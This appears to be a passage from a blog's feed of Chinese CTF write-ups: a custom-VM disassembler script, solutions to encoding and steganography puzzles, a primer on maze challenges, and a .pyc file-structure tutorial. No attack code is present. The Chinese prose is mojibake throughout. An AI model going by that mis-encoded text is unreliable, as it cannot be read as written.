  njmp_list=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                njmp_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;njmp &quot;</span>+<span class="built_in">str</span>(njmp_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(njmp_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            len_list=[]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,i+<span class="number">3</span>,<span class="number">1</span>):</span><br><span class="line">                len_list.append(byte_to_int(bincode[<span class="number">4</span>*j],bincode[<span class="number">4</span>*j+<span class="number">1</span>],bincode[<span class="number">4</span>*j+<span class="number">2</span>],bincode[<span class="number">4</span>*j+<span class="number">3</span>]))</span><br><span class="line">            op_list.append(<span class="string">&quot;len &quot;</span>+<span class="built_in">str</span>(len_list[<span class="number">0</span>])+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(len_list[<span class="number">1</span>]))</span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\opcode.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    [fp.write(<span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">for</span>  item <span class="keyword">in</span> op_list]</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ±‡ç¼–æœ‰ç‚¹é•¿ä¸»é€»è¾‘å°±åªæ˜¯ä¸€ä¸ªçº¿æ€§æ–¹ç¨‹å¼ï¼Œç”¨z3ä¸€æŠŠæ¢­ï¼Œè¿™ä¸ªç•™ç»™å¤§å®¶è‡ªå·±å°è¯•äº†</p><h3 id="stick-game"><a href="#stick-game" class="headerlink" title="stick game"></a>stick game</h3><p>ä¿®æ”¹å¾—åˆ†ï¼ˆwebé¢˜ï¼Ÿ</p><h4 id="è€ƒç‚¹ï¼šJsï¼Œobæ··æ·†"><a href="#è€ƒç‚¹ï¼šJsï¼Œobæ··æ·†" class="headerlink" title="è€ƒç‚¹ï¼šJsï¼Œobæ··æ·†"></a>è€ƒç‚¹ï¼šJsï¼Œobæ··æ·†</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240208010936245.png" alt="image-20240208010936245"></p><p>æƒ³æ³•ï¼š<a href="https://linmur.top/post/beginctf-2024-reverse-writeup/">https://linmur.top/post/beginctf-2024-reverse-writeup/</a></p><h3 id="çœŸé¾™ä¹‹åŠ›ï¼ˆä¸ä¼š"><a href="#çœŸé¾™ä¹‹åŠ›ï¼ˆä¸ä¼š" class="headerlink" title="çœŸé¾™ä¹‹åŠ›ï¼ˆä¸ä¼š"></a>çœŸé¾™ä¹‹åŠ›ï¼ˆä¸ä¼š</h3><h4 id="javaï¼Ÿè´´ä¸ªé¢˜è§£"><a href="#javaï¼Ÿè´´ä¸ªé¢˜è§£" class="headerlink" title="javaï¼Ÿè´´ä¸ªé¢˜è§£"></a>javaï¼Ÿè´´ä¸ªé¢˜è§£</h4><p><a href="https://www.yuque.com/u37581038/mrtw91/be9vb75fxnmah7s5?singleDoc#Fw1my">https://www.yuque.com/u37581038/mrtw91/be9vb75fxnmah7s5?singleDoc#Fw1my</a></p><h4 id="è€ƒç‚¹ï¼šXTEAï¼ŒMobileï¼ŒMobileè°ƒè¯•"><a href="#è€ƒç‚¹ï¼šXTEAï¼ŒMobileï¼ŒMobileè°ƒè¯•" class="headerlink" title="è€ƒç‚¹ï¼šXTEAï¼ŒMobileï¼ŒMobileè°ƒè¯•"></a>è€ƒç‚¹ï¼šXTEAï¼ŒMobileï¼ŒMobileè°ƒè¯•</h4><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tupper"><a href="#tupper" class="headerlink" title="tupper"></a>tupper</h3><p>ç”¨è¿™ä¸ªç½‘ç«™è®²é™„åŠ æ‹¼æ¥çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå›¾ç‰‡ï¼Œå³å¾—åˆ°flag <a href="https://tuppers-formula.ovh/">https://tuppers-formula.ovh/</a></p><p>åˆå­¦åˆ°äº†ä¸€ç§åŠ å¯†æ–¹å¼ã€‚ã€‚</p><h3 id="devilâ€™s-word"><a href="#devilâ€™s-word" class="headerlink" title="devilâ€™s word"></a>devilâ€™s word</h3><p>çœ‹é™„ä»¶ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d</span><br></pre></td></tr></table></figure><p>çœ‹é¢˜ç›®â€é­”é¬¼çš„è¯­è¨€â€,æœä¸€ä¸‹çŒœæƒ³æ˜¯æ¸©å·è¯ï¼Œå…¶å®å°±æ˜¯æ¸©å·è¯çš„0-9å‘éŸ³,å•ä¸ªå­—æ¯å°±è¡¨ç¤ºå•ä¸ªå­—æ¯(æ— è¯­äº†,å½“æ—¶æ²¡æƒ³åˆ°)ã€‚æ ¹æ®æ¸©å·è¯çš„å‘éŸ³ï¼Œå¾—åˆ°è¿™ä¸ªå¯¹åº”å…³ç³»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">leng 0</span><br><span class="line">lia 2</span><br><span class="line">sa 3</span><br><span class="line">sii 4</span><br><span class="line">ng 5</span><br><span class="line">leu 6</span><br><span class="line">cai 7</span><br><span class="line">bo 8</span><br><span class="line">jau 9</span><br></pre></td></tr></table></figure><p>èµ›åšå¨å­è§£ç å¾—åˆ°flag</p><h3 id="ä½ çŸ¥é“ä¸­å›½æ–‡åŒ–å—1-0"><a href="#ä½ çŸ¥é“ä¸­å›½æ–‡åŒ–å—1-0" class="headerlink" title="ä½ çŸ¥é“ä¸­å›½æ–‡åŒ–å—1.0"></a>ä½ çŸ¥é“ä¸­å›½æ–‡åŒ–å—1.0</h3><p>æ–‡æœ¬24ä¸ªå­—ç¬¦åˆ†ä¸€ç»„â†’base32è§£ç â†’å…«å¦è½¬8è¿›åˆ¶â†’8è¿›åˆ¶è½¬å­—ç¬¦ä¸²â†’å­—ç¬¦ä¸²è½¬ç¤¾ä¼šä¸»ä¹‰ç¼–ç â†’ç¤¾ä¼šä¸»ä¹‰è§£ç â†’å­—ç¬¦ä¸²æ …æ è§£å¯†å¾—åˆ°æœ€åçš„flagã€‚</p><p>å…«å¦å¯¹åº”æ•°å­—:</p><p>â˜°0<br>â˜±1<br>â˜²2<br>â˜³3<br>â˜´4<br>â˜µ5<br>â˜¶6<br>â˜·7 </p><p>å…¶ä¸­base32è§£ç è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;é™„ä»¶.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = f.readline()</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        a = a.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = base64.b32decode(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;å…«å¦.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> m:</span><br><span class="line">            m.write(b.decode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é¢˜éº»çƒ¦çš„åœ°æ–¹å°±æ˜¯æœ‰çš„åˆ†ç»„é‡Œé¢æœ‰ç‰¹æ®Šå­—ç¬¦ $ &amp; @,è¿™äº›ç‰¹æ®Šå­—ç¬¦éœ€è¦æ›¿æ¢æˆå¤§å†™è‹±æ–‡å­—æ¯æˆ–è€…æ•°å­—æ‰èƒ½æ­£ç¡®ç¼–ç ï¼Œè¿™é‡Œçš„ä¸€ä¸ªæ€è·¯å°±æ˜¯æ‰¾æœ‰æ²¡æœ‰ç›¸ä¼¼çš„åˆ†ç»„ï¼Œå°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆå¯¹åº”ä½ç½®çš„å­—ç¬¦å³å¯ã€‚(ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆå¤šä¸ªå­—ç¬¦éƒ½æœ‰å¯èƒ½æ­£ç¡®è§£ç ä¸ºå…«å¦ç¬¦ï¼Œä½†æ˜¯è¿™æ ·å¥½åƒå¹¶ä¸å½±å“ç»“æœ)</p><h3 id="ä¸‹ä¸€ç«™ä¸Šå²¸ï¼"><a href="#ä¸‹ä¸€ç«™ä¸Šå²¸ï¼" class="headerlink" title="ä¸‹ä¸€ç«™ä¸Šå²¸ï¼"></a>ä¸‹ä¸€ç«™ä¸Šå²¸ï¼</h3><p>é¢˜ç›®æè¿°: æŸåŒå­¦åœ¨è€ƒå…¬çš„æ—¶å€™çœ‹åˆ°è¿™æ ·ä¸€é“é¢˜ï¼Œå‘ç°è‡ªå·±æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°å›¾å½¢çš„å…±åŒç‰¹å¾æˆ–è§„å¾‹ä½ èƒ½å¸®å¸®ä»–å—ï¼Ÿ</p><p>ç»™çš„å›¾ç‰‡:<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206234443538.png" alt="image-20240206234443538"></p><p>zstegå›¾ç‰‡ï¼Œå‘ç°éšå†™å†…å®¹:</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240206234456075.png" alt="image-20240206234456075"></p><p>å³: 5o+Q56S6OuaRqeaWr+WvhueggQ&#x3D;&#x3D;</p><p>base64è§£å¯†å¾—åˆ°(base64ç¼–ç ç”±a-zA-Z0-9+&#x2F;ç»„æˆ):</p><p>æ ¹æ®æ¯ä¸ªå›¾å½¢çš„äº¤ç‚¹æ•°å¾—åˆ°: 221022201122120120111011110222012101<br>å°†0æ›¿æ¢æˆâ€™ â€˜ 1æ›¿æ¢æˆâ€™.â€™ 2æ›¿æ¢æˆâ€™-â€˜å†è§£ç å¾—åˆ°flag<br>(è‡³äºä¸ºä»€ä¹ˆè¿™ä¹ˆæ›¿æ¢ä¸€å…±6ç§æƒ…å†µå¯ä»¥fuzzä¸€ä¸‹)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BeginCTF-2024å†¬&quot;&gt;&lt;a href=&quot;#BeginCTF-2024å†¬&quot; class=&quot;headerlink&quot; title=&quot;BeginCTF 2024å†¬&quot;&gt;&lt;/a&gt;BeginCTF 2024å†¬&lt;/h1&gt;&lt;p&gt;å†™çš„é¢˜ä¸å¤šï¼Œä»å¸ˆå‚…ä»¬å†™çš„ç‰¹åˆ«å¥½çš„wpä»¬å­¦åˆ°äº†</summary>
      
    
    
    
    
    <category term="begin é€†å‘" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/begin-%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>è¿·å®«åŠæ•°ç‹¬é—®é¢˜</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/%E8%BF%B7%E5%AE%AB%EF%BC%8C%E6%95%B0%E7%8B%AC/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/09/%E8%BF%B7%E5%AE%AB%EF%BC%8C%E6%95%B0%E7%8B%AC/</id>
    <published>2024-02-08T16:00:00.000Z</published>
    <updated>2024-03-02T08:36:26.666Z</updated>
    
    <content type="html"><![CDATA[<p><strong>è¿·å®«åŠæ•°ç‹¬é—®é¢˜</strong></p><p><strong>è¿·å®«é—®é¢˜</strong></p><p>è¿·å®«ç±»é¢˜ç›®ï¼Œå‡ºé¢˜äººä¼šåœ¨ç¨‹åºä¸­æ„é€ ä¸€ä¸ªè¿·å®«ã€‚è¯¥è¿·å®«ä¸€èˆ¬ç”±å„ç§ç¬¦å·æ„æˆï¼Œä¸€äº›ç¬¦å·è¡¨ç¤º<strong>å¢™å£</strong>ï¼Œä¸€äº›</p><p>ç¬¦å·è¡¨ç¤º<strong>å¯ä»¥è¡Œèµ°çš„è·¯</strong>ï¼Œå¹¶æ ‡å®š<strong>å…¥å£</strong>å’Œ<strong>å‡ºå£</strong>ã€‚</p><p>ç¨‹åºä¾æ®è§£é¢˜è€…è¾“å…¥çš„å­—ç¬¦ä¸²æ¥èµ°è¿·å®«ï¼ˆå¦‚æœ‰çš„é¢˜ç›®ä»¥ w&#x2F;s&#x2F;a&#x2F;d å­—ç¬¦åˆ†åˆ«è¡¨ç¤º å‘ä¸Š&#x2F;å‘ä¸‹&#x2F;å‘å·¦&#x2F;å‘å³ è¡Œ</p><p>èµ°ä¸€æ ¼ï¼‰ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²æ»¡è¶³ä»¥<strong>æœ€çŸ­è·¯å¾„</strong>ä»å…¥å£èµ°åˆ°å‡ºå£ï¼Œå¹¶ä¸”ä¸­é—´<strong>æ²¡æœ‰ä»»ä½•ç¢°å£è¡Œä¸º</strong>ï¼Œåˆ™è·å¾— flagã€‚</p><p>è¿·å®«é—®é¢˜æœ‰ä»¥ä¸‹ç‰¹ç‚¹:</p><p>åœ¨å†…å­˜ä¸­å¸ƒç½®ä¸€å¼  â€œåœ°å›¾â€ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰</p><p>å°†ç”¨æˆ·è¾“å…¥é™åˆ¶åœ¨å°‘æ•°å‡ ä¸ªå­—ç¬¦èŒƒå›´å†…</p><p>ä¸€èˆ¬åªæœ‰ä¸€ä¸ªè¿·å®«å…¥å£å’Œä¸€ä¸ªè¿·å®«å‡ºå£</p><p>å¸ƒç½®çš„åœ°å›¾å¯ä»¥ç”±å¯æ˜¾å­—ç¬¦ (æ¯”å¦‚ # å’Œ * ) ç»„åˆè€Œæˆ (è¿™éå¸¸æ˜æ˜¾, æŸ¥çœ‹å­—ç¬¦ä¸²åŸºæœ¬å°±çŸ¥é“è¿™æ˜¯ä¸ªè¿·å®«é¢˜</p><p>äº†)ï¼Œä¹Ÿå¯ä»¥å•çº¯ç”¨ä¸å¯æ˜¾çš„åå…­è¿›åˆ¶å€¼è¿›è¡Œè¡¨ç¤ºã€‚å¯ä»¥å°†åœ°å›¾ç›´æ¥ç»„æˆä¸€æ¡éå¸¸é•¿çš„å­—ç¬¦ä¸²ï¼Œæˆ–æ˜¯ä¸€è¡Œ</p><p>ä¸€è¡Œåˆ†å¼€å¸ƒç½®ã€‚å¦‚æœæ˜¯ä¸€è¡Œä¸€è¡Œåˆ†å¼€å¸ƒç½®çš„è¯ï¼Œå› ä¸ºè¿·å®«ä¸€èˆ¬éƒ½ä¼šæ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ç”¨äºæŒ‰è¡Œ(æ³¨æ„, å¸ƒç½®å¹¶</p><p>éæŒ‰é¡ºåºå¸ƒç½®, æ¯è¡Œéƒ½å¯¹åº”ä¸€ä¸ªå…·ä½“çš„è¡Œå·, ä½ éœ€è¦ç¡®å®šè¡Œå·æ‰èƒ½è¿˜åŸè¿·å®«åœ°å›¾) å¸ƒç½®è¿·å®«çš„å‡½æ•°ä¼šæ˜æ˜¾</p><p>é‡å¤å¤šæ¬¡ã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172123084.png" alt="image-20240209172123084"></p><p>è€Œè¢«é™åˆ¶çš„å­—ç¬¦é€šå¸¸ä¼šæ˜¯ä¸€äº›æ–¹ä¾¿è®°å¿†çš„ç»„åˆï¼Œ æ¯”å¦‚ w&#x2F;s&#x2F;a&#x2F;d , h&#x2F;j&#x2F;k&#x2F;l , l&#x2F;r&#x2F;u&#x2F;d è¿™æ ·çš„ç±»ä¼¼ç»„åˆ.</p><p>å½“ç„¶å„ä¸ªé”®å…·ä½“çš„æ“ä½œéœ€è¦ç»è¿‡åˆ†æåˆ¤æ–­ã€‚å¯¹äºäºŒç»´çš„åœ°å›¾ï¼Œ ä¸€èˆ¬ä½œè€…éƒ½ä¼šè®¾ç½®ä¸€ä¸ª Xåæ ‡ å’Œä¸€ä¸ª Y</p><p>åæ ‡ ç”¨äºä¿å­˜å½“å‰ä½ç½®. æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹ç‚¹æ¥å…¥æ‰‹åˆ†æã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172133014.png" alt="image-20240209172133014"></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ è¿·å®«æ˜¯åªæœ‰ 1 ä¸ªå…¥å£å’Œ 1 ä¸ªå‡ºå£ ï¼Œåƒå…¥å£åœ¨æœ€å·¦ä¸Šè§’ (0, 0) ä½ç½®, è€Œå‡ºå£åœ¨æœ€å³ä¸‹è§’</p><p>(max_X, max_Y) å¤„ã€‚ä½†ä¹Ÿæœ‰å¯èƒ½æ˜¯å‡ºå£åœ¨è¿·å®«çš„æ­£ä¸­å¿ƒï¼Œç”¨ä¸€ä¸ª Y å­—ç¬¦è¡¨ç¤ºç­‰ç­‰ã€‚è§£ç­”è¿·å®«é¢˜çš„æ¡</p><p>ä»¶ä¹Ÿæ˜¯éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µåˆ¤æ–­çš„ã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172149912.png" alt="image-20240209172149912"></p><p>å½“ç„¶è¿·å®«çš„èµ°æ³•å¯èƒ½ä¸æ­¢ 1 æ¡ ï¼Œä¹Ÿæœ‰æƒ…å†µæ˜¯æœ‰å¤šæ¡èµ°æ³•ï¼Œ ä½†æ˜¯è¦æ±‚æŸä¸€ä¸ªèµ°æ³•æ¯”å¦‚è¯´ä»£ä»·æœ€å°ã€‚é‚£ä¹ˆ</p><p>è¿™å°±å¯ä»¥å˜ç›¸ä¸ºä¸€ä¸ªç®—æ³•é—®é¢˜ï¼ˆæœç´¢ç®—æ³•ï¼‰ã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240209172208313.png" alt="image-20240209172208313"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;è¿·å®«åŠæ•°ç‹¬é—®é¢˜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è¿·å®«é—®é¢˜&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿·å®«ç±»é¢˜ç›®ï¼Œå‡ºé¢˜äººä¼šåœ¨ç¨‹åºä¸­æ„é€ ä¸€ä¸ªè¿·å®«ã€‚è¯¥è¿·å®«ä¸€èˆ¬ç”±å„ç§ç¬¦å·æ„æˆï¼Œä¸€äº›ç¬¦å·è¡¨ç¤º&lt;strong&gt;å¢™å£&lt;/strong&gt;ï¼Œä¸€äº›&lt;/p&gt;
&lt;p&gt;ç¬¦å·è¡¨ç¤º&lt;s</summary>
      
    
    
    
    
    <category term="RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Pythoné€†å‘</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/04/python%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/04/python%E9%80%86%E5%90%91/</id>
    <published>2024-02-03T16:00:00.000Z</published>
    <updated>2024-02-05T04:54:05.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pythoné€†å‘"><a href="#Pythoné€†å‘" class="headerlink" title="Pythoné€†å‘"></a>Pythoné€†å‘</h1><h2 id="pycæ–‡ä»¶"><a href="#pycæ–‡ä»¶" class="headerlink" title="pycæ–‡ä»¶"></a>pycæ–‡ä»¶</h2><h3 id="åˆ›å»ºåŠä½¿ç”¨"><a href="#åˆ›å»ºåŠä½¿ç”¨" class="headerlink" title="åˆ›å»ºåŠä½¿ç”¨"></a>åˆ›å»ºåŠä½¿ç”¨</h3><p>pyc æ–‡ä»¶æ˜¯ python åœ¨ç¼–è¯‘ *.py æ–‡ä»¶è¿‡ç¨‹ä¸­å‡ºç°çš„<strong>ä¸»è¦ä¸­é—´è¿‡ç¨‹</strong>æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§<strong>äºŒè¿›åˆ¶</strong>æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§bytecode<strong>ã€‚pyc æ–‡ä»¶æ˜¯å¯ä»¥ç”± <strong>python</strong> <strong>è™šæ‹Ÿæœº</strong>ç›´æ¥æ‰§è¡Œçš„ç¨‹åºã€‚å› æ­¤åˆ†æ <strong>pyc</strong> <strong>æ–‡ä»¶çš„æ–‡ä»¶ç»“æ„</strong>å¯¹äºå®ç° pyc åç¼–è¯‘å°±æ˜¾å¾—ååˆ†é‡è¦ã€‚å¦å¤–ï¼Œ</strong>pyc** <strong>çš„å†…å®¹ï¼Œæ˜¯è·Ÿ</strong> <strong>python</strong> <strong>çš„ç‰ˆæœ¬ç›¸å…³çš„</strong>ï¼Œä¸åŒç‰ˆæœ¬ç¼–è¯‘åçš„pyc æ–‡ä»¶æ˜¯ä¸åŒçš„ï¼Œ3.8 ç¼–è¯‘çš„ pyc æ–‡ä»¶ï¼Œ3.7 ç‰ˆæœ¬çš„ python æ˜¯æ— æ³•æ‰§è¡Œçš„ã€‚</p><p>å…ˆå†™ä¸ª test.pyï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">v1, v2</span>):</span><br><span class="line"><span class="keyword">return</span> v1 + v2</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ py_compile æ¨¡å—æ¥ç”Ÿæˆ pyc æ–‡ä»¶ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> py_compile <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">compile</span>(<span class="string">&quot;test.py&quot;</span>)</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥é€šè¿‡å‘½ä»¤è¡Œ python -m test.py ç”Ÿæˆ pycã€‚</p><p>ä¸¤ç§æ“ä½œéƒ½ä¼šåœ¨å½“å‰ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <strong>pycache</strong> ç›®å½•ï¼Œå…¶ä¸­å­˜æ”¾ç€ test.cpython-ç‰ˆæœ¬å·.pyc ã€‚</p><p>å¦‚æœæœ‰ä¸€ä¸ªç°æˆçš„ pyc æ–‡ä»¶ï¼Œè¦å¦‚ä½•å¯¼å…¥å®ƒå‘¢ï¼Ÿ</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line">test = SourcelessFileLoader(</span><br><span class="line"><span class="string">&quot;test&quot;</span>, <span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span></span><br><span class="line">).load_module()</span><br><span class="line"><span class="built_in">print</span>(test.a)</span><br><span class="line"><span class="built_in">print</span>(test.add(<span class="number">1</span>, <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a><strong>æ–‡ä»¶ç»“æ„</strong></h3><p>pyc æ–‡ä»¶åœ¨åˆ›å»ºçš„æ—¶å€™éƒ½ä¼šå¾€é‡Œé¢å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><p><strong>1. magic number</strong></p><p>è¿™æ˜¯ Python å®šä¹‰çš„ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä¸åŒç‰ˆæœ¬çš„ Python ä¼šå®šä¹‰ä¸åŒçš„ magic numberï¼Œè¿™ä¸ªå€¼æ˜¯ä¸ºäº†ä¿è¯ Python èƒ½å¤ŸåŠ è½½æ­£ç¡®çš„ pycã€‚</p><p>æ¯”å¦‚ Python3.7 ä¸ä¼šåŠ è½½ 3.6 ç‰ˆæœ¬çš„ pycï¼Œå› ä¸º Python åœ¨åŠ è½½ pyc æ–‡ä»¶çš„æ—¶å€™ä¼šé¦–å…ˆæ£€æµ‹è¯¥ pyc çš„magic numberã€‚å¦‚æœå’Œè‡ªèº«çš„ magic number ä¸ä¸€è‡´ï¼Œåˆ™æ‹’ç»åŠ è½½ã€‚</p><p><strong>2.</strong> <strong>åˆ›å»ºæ—¶é—´æˆ³</strong></p><p>è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œåœ¨åŠ è½½ pyc ä¹‹å‰ä¼šå…ˆæ¯”è¾ƒæºä»£ç çš„æœ€åä¿®æ”¹æ—¶é—´å’Œ pyc æ–‡ä»¶çš„å†™å…¥æ—¶é—´ã€‚å¦‚æœ pyc æ–‡ä»¶çš„å†™å…¥æ—¶é—´æ¯”æºä»£ç çš„ä¿®æ”¹æ—¶é—´è¦æ—©ï¼Œè¯´æ˜åœ¨ç”Ÿæˆ pyc ä¹‹åï¼Œæºä»£ç è¢«ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆä¼šé‡æ–°ç¼–è¯‘å¹¶å†™å…¥pycï¼Œè€Œåä¹‹åˆ™ä¼šç›´æ¥åŠ è½½å·²å­˜åœ¨çš„ pycã€‚</p><p><strong>3. py</strong> <strong>æ–‡ä»¶çš„å¤§å°</strong></p><p>py æ–‡ä»¶çš„å¤§å°ä¹Ÿä¼šè¢«è®°å½•åœ¨ pyc æ–‡ä»¶ä¸­ã€‚</p><p><strong>4. PyCodeObject</strong> <strong>å¯¹è±¡</strong></p><p>ç¼–è¯‘ä¹‹åçš„ PyCodeObject å¯¹è±¡ï¼Œå¹¶ä¸”æ˜¯åºåˆ—åŒ–ä¹‹åå†å­˜å‚¨ã€‚å› æ­¤ pyc æ–‡ä»¶çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204124547436.png" alt="image-20240204124547436"></p><p>ä»¥ä¸Šæ˜¯ Python 3.7+ çš„ pyc æ–‡ä»¶ç»“æ„ï¼Œå¦‚æœç‰ˆæœ¬ä½äº 3.7ï¼Œé‚£ä¹ˆå¼€å¤´æ²¡æœ‰ 4 ä¸ª \x00ã€‚æˆ‘ä»¬å®é™…éªŒ</p><p>è¯ä¸€ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> importlib.util <span class="keyword">import</span> MAGIC_NUMBER</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment"># 0 ~ 4 å­—èŠ‚æ˜¯ MAGIC NUMBER</span></span><br><span class="line"><span class="built_in">print</span>(data[: <span 